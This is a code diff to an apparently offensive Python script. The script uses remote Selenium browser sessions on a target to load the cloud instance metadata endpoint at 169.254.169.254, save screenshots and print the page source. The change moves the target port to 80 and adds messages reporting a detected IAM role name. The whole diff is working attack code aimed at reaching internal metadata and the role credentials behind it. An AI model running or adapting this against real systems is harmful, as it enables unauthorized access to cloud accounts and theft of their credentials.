@@ -5,7 +5,7 @@ from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
 
 ######### CONFIG SECTION ###########
 IP = "127.0.0.1"
-PORT = "5555"
+PORT = "80"
 URL = "http://169.254.169.254/latest/meta-data/"
 
 ####################################
@@ -21,8 +21,9 @@ def try_chrome(IP,PORT,URL):
 		driver.save_screenshot('screenshots_chrome.png')
 		print ("[*] Screenshot Saved [*]")
 		html_source = driver.page_source
-		if "iam" in html_source:
-			print ("[*] "+html_source+" [*]")
+		if "iam/" in html_source:
+			print ("[*] IAM Role Detected [*]")
+			print ("[*] IAM Role Name: "+html_source+" [*]")
 		driver.quit()
 	except:
 		print ("[*] Chrome not Avalible On This Server [*]")
@@ -37,8 +38,9 @@ def try_firefox (IP,PORT,URL):
 		driver.maximize_window()
 		driver.save_screenshot('screenshots_firefox.png')
 		print ("[*] Screenshot Saved [*]")
-		if "iam" in html_source:
-			print ("[*] "+html_source+" [*]")
+		if "iam/" in html_source:
+			print ("[*] IAM Role Detected [*]")
+			print ("[*] IAM Role Name: "+html_source+" [*]")
 		driver.quit()
 		driver.quit()
 	except:
@@ -56,8 +58,9 @@ def try_ie (IP,PORT,URL):
 		driver.maximize_window()
 		driver.save_screenshot('screenshots_ie.png')
 		print ("[*] Screenshot Saved [*]")
-		if "iam" in html_source:
-			print ("[*] "+html_source+" [*]")
+		if "iam/" in html_source:
+			print ("[*] IAM Role Detected [*]")
+			print ("[*] IAM Role Name: "+html_source+" [*]")
 		driver.quit()
 	except:
 		print ("[*] IE not Avalible On This Server [*]")
